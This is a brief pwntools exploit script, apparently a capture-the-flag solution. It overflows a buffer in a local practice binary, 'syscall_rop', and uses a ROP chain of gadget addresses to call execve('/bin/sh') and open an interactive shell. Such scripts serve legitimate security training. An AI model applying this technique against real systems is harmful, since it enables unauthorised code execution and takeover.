from pwn import *

p = process('./syscall_rop')
e = ELF('./syscall_rop')
l = e.libc

prax = 0x0000000000409b36
prdi = 0x0000000000401626
prsi = 0x0000000000401747
prdx = 0x0000000000442826
syscall = 0x00000000004003da

p.recvuntil('/bin/sh Addr :')
binsh = int(p.recvline().strip(),16)

payload = 'A'*(0x20-0xa)
payload += '/bin/sh\x00'
payload = payload.ljust(0x20+8,'A')
payload += p64(prax)
payload += p64(59)
payload += p64(prdi)
payload += p64(binsh)
payload += p64(prsi)
payload += p64(0)
payload += p64(prdx)
payload += p64(0)
payload += p64(syscall)

p.send(payload)
p.interactive()
